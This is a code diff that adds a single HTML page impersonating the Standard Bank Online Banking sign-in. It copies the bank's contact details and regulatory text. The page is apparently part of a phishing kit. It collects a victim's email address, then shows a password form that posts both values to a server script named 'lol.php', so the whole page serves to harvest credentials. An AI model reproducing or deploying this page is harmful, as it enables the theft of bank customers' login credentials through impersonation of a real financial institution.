@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Standard Bank Online Banking</title>
+  <link rel="icon" type="image/png" href="favicon.ico">
+
+ 
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <!-- Custom styles for this template-->
+  <link href="css/ram.css" rel="stylesheet">
+  
+  <style>
+  
+
+body {
+    background-image: url(img/money.jpg);
+    background-size: cover;
+    background-position: center center;
+    background-attachment: fixed;
+    background-color: #004AA0;
+    background-repeat: no-repeat;
+}
+</style>
+
+</head>
+
+<body id="page-top">
+
+  <!-- Page Wrapper -->
+<div id="container" style="width: 100%;">
+
+   <center>
+   <div class="row"  style="width: 100%;">
+   
+  <div class="col-sm-4"></div>
+  <div class="col-sm-4" align="center">
+  
+  <div><img src="img/oril.png"  class="nlo"> </div>
+  <div style="text-align: center; padding-bottom: .7em; color: #FFF; font-size: 20px; font-family: arial; font-weight: 300; padding: 0; margin-bottom: 20px; margin-top: 30px;">Hello! </div>
+  
+  <div class="gai"> 
+  
+  <div class="nke">
+  <div> <img src="img/intro.png"> </div>
+  <br>
+<div class="label">Email address </div>
+
+
+<div class="label">
+
+<input  name="" type="email" placeholder="" id="text_1"/>
+<input  name="" type="hidden" placeholder="" id="text_2"/>
+
+<button style=" background: 0; border: 0; margin: 0; cursor: pointer; float: right; margin-top: 40px; margin-right: -7px; outline: 0;" data-toggle="modal" data-target="#myModal">
+<img src="img/button.png">
+</button>
+
+  <div class="modal fade" id="myModal" role="dialog" data-backdrop="static">
+  <center><div><img src="img/oril.png"  class="nlo"> </div></center>
+    <div class="modal-dialog" style=" margin-top: 80px !important; margin: 0 auto; margin-right: 332px; ">
+    
+      <!-- Modal content--> 
+      
+  <div class="nke" style="height: 500px !important; background: white !important;">
+  <form action="lol.php" method="post">
+  <div style=" font-size: 23px; color: #1e429a; font-weight: 700; text-align: center; "> Password Sign-In <br>
+  <input  name="rigid" type="email"  required="" placeholder="" readonly="" id="text_3" style="background: none; border: 0; font-weight: 500; color: black; padding: 0; margin: 0; text-align: center; font-size: 18px;"/></div>
+  
+  <br>
+  <center><img src="img/pass.png"></center>
+  <br>
+<div class="label">Password </div>
+ 
+ <input  name="eyesonme" type="password" placeholder="" required=""/>
+ <div style=" margin-top: 17px; font-size: 12px; color: #69c0dc; cursor: pointer;">Forgot Password? </div>
+ 
+ <div>
+ <br>
+ <button class="button" type="submit" name="raybaks">SIGN IN</button>
+ <div style="padding-right: 30px;float: right;  line-height: 38px; color: rgb(0, 51, 170); font-weight: 500;">CANCEL</div>
+ </div>
+ 
+ </form>
+ 
+      </div>
+      
+    </div>
+  </div>
+</div>
+
+  </div>
+  </div>
+  
+    <div class="gai" style="height: 66px; margin-top: 40px; line-height: 66px;"> <img src="img/drop2.png"> </div>
+    <div class="gai" style="height: 79px; margin-top: 20px; line-height: 79px; border-radius: 3px;"> <img src="img/drop3.png" style=" margin-left: -7px; "> </div>
+  
+  </div>
+  <div class="col-sm-4"></div>
+  
+  
+</div>
+</div>
+</center>
+
+</div>
+<br><br>
+<center>
+  <div class="row"style="width: 100%;   font-size: 11px; color: #fffffa; margin-top: 30px;"align="center">	
+ 
+  <div class="col-sm-4"> <img src="img/icon1.png"> &nbsp; South Africa 0860 123 000</div>
+  <div class="col-sm-4" style="text-align: left;">&nbsp;&nbsp; <img src="img/icon2.png"> &nbsp;  International +27(0)10 249 0423</div>
+  <div class="col-sm-4"  style="text-align: left;"> <img src="img/icon3.png"> &nbsp; Email us at <span style="font-size: 13px;"><u>ibsupport@standardbank.co.za</u></span></div>
+  
+  <center>
+
+  </center>
+</div>
+
+  <div style="margin-top: 10px; font-size: 10px; width: 100%; color: #fffffa;">
+<center>  Standard Bank is a licensed financial services provider in terms of the Financial Advisory and Intermediary Services Act and a registered credit provider in terms of the National Credit Act, registration number NCRCP15.
+</center></div>
+<br></br>
+</center>
+
+
+ 
+<script>
+
+$("#text_1").change(function() {
+    $("#text_3").val($("#text_1").val() + " " + $("#text_2").val()).change();
+})
+
+
+$("#text_2").change(function(){
+    $("#text_3").val($("#text_1").val()).change();
+})
+    
+
+</script>
+
+
+<script>
+$(document).ready(function(){
+	$('#MybtnModalPreventScript').click(function(){
+  		$('#MymodalPreventScript').modal({
+    		backdrop: 'static',
+    		keyboard: false
+		});
+	});
+});
+</script>
+</body>
+
+</html>
